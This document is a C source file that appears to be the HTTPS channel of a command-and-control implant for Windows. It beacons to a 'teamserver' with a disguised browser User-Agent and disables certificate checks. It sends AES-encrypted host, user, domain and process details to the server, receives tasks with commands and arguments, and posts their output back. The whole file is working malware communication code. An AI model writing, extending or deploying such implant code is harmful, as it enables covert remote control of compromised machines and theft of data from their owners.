#include "https.h"
#include "../config.h"
#include "../crypto/aes.h"
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

/*
 * HTTPS Communication Channel
 * Uses WinHTTP for HTTPS requests to the teamserver
 * All traffic is AES-256-GCM encrypted with PSK
 */

static HINTERNET hSession = NULL;
static BYTE aes_key[32];

// Escape a string for JSON: handle \, ", \n, \r, \t, control chars
static int json_escape_string(char* dst, int dst_size, const char* src) {
    int pos = 0;
    if (!src) return 0;

    for (int i = 0; src[i] && pos < dst_size - 6; i++) {
        unsigned char c = (unsigned char)src[i];
        switch (c) {
            case '\\': dst[pos++] = '\\'; dst[pos++] = '\\'; break;
            case '"':  dst[pos++] = '\\'; dst[pos++] = '"';  break;
            case '\n': dst[pos++] = '\\'; dst[pos++] = 'n';  break;
            case '\r': dst[pos++] = '\\'; dst[pos++] = 'r';  break;
            case '\t': dst[pos++] = '\\'; dst[pos++] = 't';  break;
            case '\b': dst[pos++] = '\\'; dst[pos++] = 'b';  break;
            case '\f': dst[pos++] = '\\'; dst[pos++] = 'f';  break;
            default:
                if (c < 0x20) {
                    pos += snprintf(dst + pos, dst_size - pos, "\\u%04x", c);
                } else {
                    dst[pos++] = c;
                }
                break;
        }
    }
    dst[pos] = '\0';
    return pos;
}

// Simple JSON builder (no external deps)
static int json_build_metadata(char* buf, int buf_size, DN_METADATA* meta) {
    // process_name contains Windows paths with backslashes, must escape
    char esc_proc[512];
    json_escape_string(esc_proc, sizeof(esc_proc), meta->process_name);
    char esc_host[256];
    json_escape_string(esc_host, sizeof(esc_host), meta->hostname);
    char esc_user[256];
    json_escape_string(esc_user, sizeof(esc_user), meta->username);
    char esc_domain[256];
    json_escape_string(esc_domain, sizeof(esc_domain), meta->domain);

    return snprintf(buf, buf_size,
        "{\"id\":\"%s\",\"hostname\":\"%s\",\"username\":\"%s\","
        "\"domain\":\"%s\",\"internal_ip\":\"%s\",\"os\":\"%s\","
        "\"arch\":\"%s\",\"pid\":%lu,\"process_name\":\"%s\","
        "\"sleep\":%d,\"jitter\":%d}",
        meta->id, esc_host, esc_user,
        esc_domain, meta->internal_ip, meta->os,
        meta->arch, meta->pid, esc_proc,
        meta->sleep, meta->jitter
    );
}

static int json_build_result(char* buf, int buf_size, DN_TASK_RESULT* result) {
    // escape output field since it can contain newlines, quotes, backslashes
    char escaped[65536];
    json_escape_string(escaped, sizeof(escaped), result->output);

    return snprintf(buf, buf_size,
        "{\"task_id\":\"%s\",\"status\":\"%s\",\"output\":\"%s\"}",
        result->task_id, result->status, escaped
    );
}

static int json_build_results_array(char* buf, int buf_size, DN_TASK_RESULT* results, int count) {
    int pos = 0;
    buf[pos++] = '[';
    for (int i = 0; i < count; i++) {
        if (i > 0) buf[pos++] = ',';
        pos += json_build_result(buf + pos, buf_size - pos, &results[i]);
    }
    buf[pos++] = ']';
    buf[pos] = '\0';
    return pos;
}

// Minimal JSON parser for check-in response
// Finds tasks array and extracts id, command, args for each
static BOOL parse_checkin_response(const char* json, DN_CHECKIN_RESPONSE* resp) {
    resp->tasks = NULL;
    resp->task_count = 0;

    // find "tasks" array
    const char* tasks_start = strstr(json, "\"tasks\"");
    if (!tasks_start) return TRUE; // no tasks is valid

    const char* arr_start = strchr(tasks_start, '[');
    if (!arr_start) return TRUE;

    // count objects in array
    int count = 0;
    const char* p = arr_start;
    while ((p = strchr(p + 1, '{')) != NULL) count++;

    if (count == 0) return TRUE;

    resp->tasks = (DN_TASK*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DN_TASK) * count);
    if (!resp->tasks) return FALSE;
    resp->task_count = count;

    // parse each task object
    p = arr_start;
    for (int i = 0; i < count; i++) {
        p = strchr(p, '{');
        if (!p) break;

        // extract "id" field
        const char* id_start = strstr(p, "\"id\":\"");
        if (id_start) {
            id_start += 6;
            const char* id_end = strchr(id_start, '"');
            if (id_end) {
                int len = (int)(id_end - id_start);
                if (len > 63) len = 63;
                memcpy(resp->tasks[i].id, id_start, len);
            }
        }

        // extract "command" field
        const char* cmd_start = strstr(p, "\"command\":\"");
        if (cmd_start) {
            cmd_start += 11;
            const char* cmd_end = strchr(cmd_start, '"');
            if (cmd_end) {
                int len = (int)(cmd_end - cmd_start);
                if (len > 63) len = 63;
                memcpy(resp->tasks[i].command, cmd_start, len);
            }
        }

        // extract "args" field
        const char* args_start = strstr(p, "\"args\":\"");
        if (args_start) {
            args_start += 8;
            const char* args_end = strchr(args_start, '"');
            if (args_end) {
                int len = (int)(args_end - args_start);
                resp->tasks[i].args = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + 1);
                if (resp->tasks[i].args) {
                    memcpy(resp->tasks[i].args, args_start, len);
                    resp->tasks[i].args_len = len;
                }
            }
        }

        p++;
    }

    return TRUE;
}

BOOL dn_https_init(void) {
    // decode PSK
    dn_aes_init(aes_key, DN_PSK_HEX);

    // convert host to wide string for WinHTTP
    wchar_t wHost[256];
    MultiByteToWideChar(CP_UTF8, 0, DN_C2_HOST, -1, wHost, 256);

    hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    return hSession != NULL;
}

// Internal: send POST request and receive response
static BYTE* http_post(const wchar_t* uri, const BYTE* body, DWORD body_len, DWORD* resp_len) {
    wchar_t wHost[256];
    MultiByteToWideChar(CP_UTF8, 0, DN_C2_HOST, -1, wHost, 256);

    HINTERNET hConnect = WinHttpConnect(hSession, wHost, DN_C2_PORT, 0);
    if (!hConnect) return NULL;

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"POST", uri,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        return NULL;
    }

    // ignore cert errors for self-signed certs
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    // set headers
    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/octet-stream",
                             (ULONG)-1L, WINHTTP_ADDREQ_FLAG_REPLACE);

    // send request
    BOOL sent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                   (LPVOID)body, body_len, body_len, 0);
    if (!sent) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        return NULL;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        return NULL;
    }

    // read response
    DWORD total_size = 0;
    BYTE* response = NULL;
    DWORD bytes_read = 0;
    DWORD chunk_size = 0;

    do {
        WinHttpQueryDataAvailable(hRequest, &chunk_size);
        if (chunk_size == 0) break;

        BYTE* new_buf = (BYTE*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                            response ? response : HeapAlloc(GetProcessHeap(), 0, 1),
                                            total_size + chunk_size + 1);
        if (!new_buf) break;
        response = new_buf;

        WinHttpReadData(hRequest, response + total_size, chunk_size, &bytes_read);
        total_size += bytes_read;
    } while (chunk_size > 0);

    if (response) response[total_size] = '\0';
    *resp_len = total_size;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    return response;
}

BOOL dn_https_checkin(DN_METADATA* meta, DN_CHECKIN_RESPONSE* response) {
    // build JSON metadata
    char json_buf[2048];
    int json_len = json_build_metadata(json_buf, sizeof(json_buf), meta);

    // encrypt
    DWORD enc_len = 0;
    BYTE* encrypted = dn_aes_encrypt(aes_key, (BYTE*)json_buf, json_len, &enc_len);
    if (!encrypted) return FALSE;

    // send to checkin URI
    wchar_t wURI[256];
    MultiByteToWideChar(CP_UTF8, 0, DN_C2_CHECKIN_URI, -1, wURI, 256);

    DWORD resp_len = 0;
    BYTE* resp_data = http_post(wURI, encrypted, enc_len, &resp_len);
    HeapFree(GetProcessHeap(), 0, encrypted);

    if (!resp_data || resp_len == 0) return FALSE;

    // decrypt response
    DWORD dec_len = 0;
    BYTE* decrypted = dn_aes_decrypt(aes_key, resp_data, resp_len, &dec_len);
    HeapFree(GetProcessHeap(), 0, resp_data);

    if (!decrypted) return FALSE;

    // parse response
    BOOL ok = parse_checkin_response((char*)decrypted, response);
    HeapFree(GetProcessHeap(), 0, decrypted);

    return ok;
}

BOOL dn_https_send_results(DN_TASK_RESULT* results, int count) {
    if (count == 0) return TRUE;

    char json_buf[65536];
    int json_len = json_build_results_array(json_buf, sizeof(json_buf), results, count);

    DWORD enc_len = 0;
    BYTE* encrypted = dn_aes_encrypt(aes_key, (BYTE*)json_buf, json_len, &enc_len);
    if (!encrypted) return FALSE;

    wchar_t wURI[256];
    MultiByteToWideChar(CP_UTF8, 0, DN_C2_RESULT_URI, -1, wURI, 256);

    DWORD resp_len = 0;
    BYTE* resp_data = http_post(wURI, encrypted, enc_len, &resp_len);
    HeapFree(GetProcessHeap(), 0, encrypted);

    if (resp_data) HeapFree(GetProcessHeap(), 0, resp_data);

    return resp_data != NULL;
}

void dn_https_cleanup(void) {
    if (hSession) {
        WinHttpCloseHandle(hSession);
        hSession = NULL;
    }
    // zero the key
    SecureZeroMemory(aes_key, sizeof(aes_key));
}
